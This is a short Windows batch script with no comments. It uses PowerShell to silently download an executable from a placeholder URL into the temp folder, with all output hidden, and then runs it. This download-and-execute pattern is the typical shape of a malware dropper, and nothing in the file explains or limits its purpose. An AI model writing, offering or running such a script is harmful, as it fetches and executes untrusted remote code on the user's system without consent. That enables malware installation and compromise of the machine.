@echo off
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://updates.example.invalid/tool', '%TEMP%\tool.exe')" >nul 2>&1
powershell -Command "Start-Process -FilePath '%TEMP%\tool.exe'"
